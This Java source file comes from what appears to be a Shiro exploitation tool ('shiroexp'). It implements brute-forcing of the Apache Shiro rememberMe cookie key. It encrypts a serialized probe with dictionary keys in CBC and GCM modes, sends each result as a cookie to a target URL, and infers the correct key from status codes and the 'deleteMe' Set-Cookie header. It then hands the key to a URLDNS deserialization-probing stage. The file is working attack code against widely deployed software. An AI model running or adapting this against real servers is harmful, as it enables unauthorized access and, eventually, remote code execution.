package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.KeyInfoObj;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.ui.tabpane.Shiro550Tab;
import com.y5neko.shiroexp.ui.tabpane.URLDNSTab;
import javafx.application.Platform;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class BruteKey {
    /**
     * @param url 目标地址
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        return bruteKey(url, "rememberMe", globalComponents);
    }

    /**
     * key爆破模块
     * @param url 目标地址
     * @param rememberMeString 自定义rememberMe字段名
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String key;
        String checkData = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
        String[] keys = Tools.multiLoadFile("./misc/keys.txt");
        KeyInfoObj keyInfoObj = new KeyInfoObj();

        boolean checkFlag = false;

        // 遍历key字典进行爆破
        for (String s : keys) {

            // 延迟100ms，防止UI线程冲突
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                System.out.println(e.getMessage());
            }

            String payload_cbc = rememberMeString + "=" + Tools.CBC_Encrypt(s, checkData);
            String payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(s, checkData);

            // 构造3种payload进行对比
            Map<String, String> headers_123 = new HashMap<>();
            headers_123.put("Cookie", rememberMeString + "=" + "123");
            ResponseOBJ response_123 = HttpRequest.httpRequest(url, null, headers_123, "GET");

            Map<String, String> headers_cbc = new HashMap<>();
            headers_cbc.put("Cookie", payload_cbc);
            ResponseOBJ response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");

            Map<String, String> headers_gcm = new HashMap<>();
            headers_gcm.put("Cookie", payload_gcm);
            ResponseOBJ response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");

            // 先判断是否存在shiro框架
            if (Objects.requireNonNull(response_123.getHeaders().get("Set-Cookie")).contains(rememberMeString) && !checkFlag) {
                System.out.println(Log.buffer_logging("INFO", "存在shiro框架"));
                if (globalComponents.logArea!= null) {
                    Platform.runLater(() -> {
                        globalComponents.logArea.appendText("[INFO]存在shiro框架\n");
                    });
                    checkFlag = true;
                }
            } else if (!Objects.requireNonNull(response_123.getHeaders().get("Set-Cookie")).contains(rememberMeString) && !checkFlag){
                System.out.println(Log.buffer_logging("INFO", "不存在shiro框架"));
                if (globalComponents.logArea!= null) {
                    Platform.runLater(() -> {
                        globalComponents.logArea.appendText("[INFO]不存在shiro框架\n");
                    });
                }
                return keyInfoObj;
            }

            // 控制台打印
            System.out.println(Log.buffer_logging("INFO", "正在尝试key: " + s));
            // UI打印
            if (globalComponents.logArea != null) {
                Platform.runLater(() -> {
                    globalComponents.logArea.appendText("[INFO]正在尝试key: " + s + "\n");
                });
            }

            // 判断响应
            // shiro在密钥错误时会返回400状态码，并且响应体中会包含deleteMe特征
            // 第一种情况：没有deleteMe特征，不存在shiro框架
            // 第二种情况：CBC模式的payload状态码不为400，并且响应体中没有deleteMe特征，说明CBC模式的payload是有效的
            // 第三种情况：GCM模式的payload状态码不为400，并且响应体中没有deleteMe特征，说明GCM模式的payload是有效的
            if (response_cbc != null && response_gcm != null) {
                int length_123 = response_123.getHeaders().size();
                int length_cbc = response_cbc.getHeaders().size();
                int length_gcm = response_gcm.getHeaders().size();

                if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
                    key = s;
                    keyInfoObj.setKey(key);
                    keyInfoObj.setType("CBC");
                    break;
                }
                if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
                    key = s;
                    keyInfoObj.setKey(key);
                    keyInfoObj.setType("GCM");
                    break;
                }
            }
        }

        // 处理前端显示
        if (globalComponents.logArea != null) {
            Platform.runLater(() -> {
                globalComponents.logArea.appendText("[SUCC]发现key: " + keyInfoObj.getKey() + "，类型为：" + keyInfoObj.getType() + "\n");
                globalComponents.rememberMeField.setText(keyInfoObj.getKey());
                globalComponents.cryptTypeComboBox.getSelectionModel().select(keyInfoObj.getType());

                // 自动同步到 FindClassByURLDNS 标签页
                globalComponents.logArea.appendText("========================================\n");
                globalComponents.logArea.appendText("[提示] 配置已自动同步到「FindClassByURLDNS」标签页\n");
                globalComponents.logArea.appendText("========================================\n\n");
            });
        }

        // 调用 URLDNS 探测标签页的更新方法
        URLDNSTab.updateFromShiro550Static(url.getUrl(), keyInfoObj.getKey(), rememberMeString);

        return keyInfoObj;
    }

    public static void main(String[] args) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
//        KeyInfoObj key = bruteKey(new TargetOBJ("http://127.0.0.1:8080/login"), logTextArea);
//        System.out.println(key);
    }
}

